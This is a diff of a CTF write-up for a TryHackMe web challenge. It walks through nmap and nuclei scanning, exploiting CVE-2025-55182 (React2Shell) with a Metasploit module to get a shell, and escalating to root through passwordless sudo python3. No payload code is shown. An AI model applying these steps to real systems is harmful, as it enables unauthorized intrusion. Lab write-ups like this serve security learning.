@@ -2,12 +2,12 @@
 title: "Corp Website"
 date: 2026-02-17
 categories:
-  - THM
+  - THM_Love_at_First_Breach_2026
 tags:
-  - CTF
-  - "2026"
+  - Web
+  - 2026
 platform: THM Love at First Breach 2026
-competition_year: "2026"
+competition_year: 2026
 toc: true
 toc_sticky: true
 ---
@@ -16,7 +16,7 @@ toc_sticky: true
 
 |Category         |	Author                |
 |-----------------|-----------------------|
-| 🌐 Web         |TryHackMe      |
+|🌐 Web         |TryHackMe      |
 
 ## Challenge Prompt
 My Dearest Hacker,
@@ -32,35 +32,41 @@ You can find the web application here: `http://MACHINE_IP:3000`
 
 ## Problem Type
 - Web
-- React2Shell
-- CVE-2025-55182
+- React2Shell (CVE--2025-55182)
+- CVE Exploit
 
 ## Solve
 Upon visiting the page we see Romance & Co.<br>
-I started this one with a quick nmap using `nmap -p 3000 -T4 -A <SITE IP>`
-<img width="1360" height="743" alt="image" src="https://github.com/user-attachments/assets/e54109b0-a1b8-4d5e-9fa2-28536d28e4f7" />
+I started this one with a quick nmap using `nmap -p 3000 -T4 -A SITE_IP`
+<img width="1360" height="743" alt="2026-02-14_23-18-14" src="https://github.com/user-attachments/assets/0a9251b7-0cd1-4501-89ff-2d0d33f0d5f3" />
+
 
 I spent a lot of time playing with different things on the site, running FFUF, etc but I noticed this one is made with Next.js.
-I decided to run nuclei with `nuclei -u http://<SITE IP>:3000` to see if there were any vulnerabilities:
-<img width="1348" height="491" alt="image" src="https://github.com/user-attachments/assets/a485ff3d-f2dc-480e-a0a5-5b7139039108" />
+I decided to run nuclei with `nuclei -u http://SITE_IP:3000` to see if there were any vulnerabilities:
+<img width="1348" height="491" alt="2026-02-14_23-48-03" src="https://github.com/user-attachments/assets/9d03a1e2-ab15-48ba-b8d8-9de932659728" />
 
-Jackpot! CVE-2025-55182 is React2Shell a critical RCE vulnarability.
+
+Jackpot! CVE-2025-55182 is React2Shell, a critical Remote Code Execution (RCE) vulnerability.
 From there I moved into Metasploit with `msfconsole`.
 
 Then I ran `search CVE-2025-55182` to see if there were any plug ins to exploit this and there were:
-<img width="1337" height="684" alt="image" src="https://github.com/user-attachments/assets/75c0086d-87d6-4c9c-9366-1c7740f0113f" />
+<img width="1337" height="684" alt="2026-02-14_23-52-16" src="https://github.com/user-attachments/assets/f5146f19-ec88-4a9b-972a-dd9dd494fb5b" />
 
 I ran `use 0` to use the exploit. Then `options` to see what I needed to set.
 I ran `set RHOSTS SITE_IP`, `set RPORT 3000`, and `set LHOST MY_IP`. Then I ran `exploit` to kick off the attack.
 
 I was able to get a shell as the user `daniel`:
-<img width="913" height="159" alt="image" src="https://github.com/user-attachments/assets/cf4d8976-ac10-434a-9a26-c23e3c4861f4" />
+<img width="913" height="159" alt="2026-02-15_00-08-38" src="https://github.com/user-attachments/assets/e2d6db36-7291-4996-99bf-de81c52e6c4c" />
+
 
 Since we need the user flag, I ran `cd ~` to go to his home directory and then ran an `ls -la` and found the `user.txt` file. `cat` that file out and we get the first flag:<br>
-<img width="586" height="153" alt="image" src="https://github.com/user-attachments/assets/3f5528b0-5039-4d18-b474-de013d7ba23b" />
+<img width="586" height="153" alt="2026-02-15_00-00-29" src="https://github.com/user-attachments/assets/60b7cf73-9ab2-4419-94e0-4abc2536a2f4" />
+
 
 Then I ran a `sudo -l` and saw the daniel user can run `python3` as root with no password:
-<img width="683" height="169" alt="image" src="https://github.com/user-attachments/assets/73e81e8e-1b17-468e-b1b8-c891d774d004" />
+<img width="683" height="169" alt="2026-02-15_00-05-23" src="https://github.com/user-attachments/assets/d81a3482-a3f3-42ca-b0aa-009f0ec1a2a2" />
+
 
 I then used [GTFO bins Python File Read](https://gtfobins.org/gtfobins/python/#file-read) to see the flag at /root/root.txt:
-<img width="529" height="49" alt="image" src="https://github.com/user-attachments/assets/134f88d2-617a-4ac2-8c5a-e817be85540e" />
+<img width="529" height="49" alt="2026-02-15_00-06-35" src="https://github.com/user-attachments/assets/8197922e-729b-4e9c-a4ef-14cfb91b8cfe" />
+
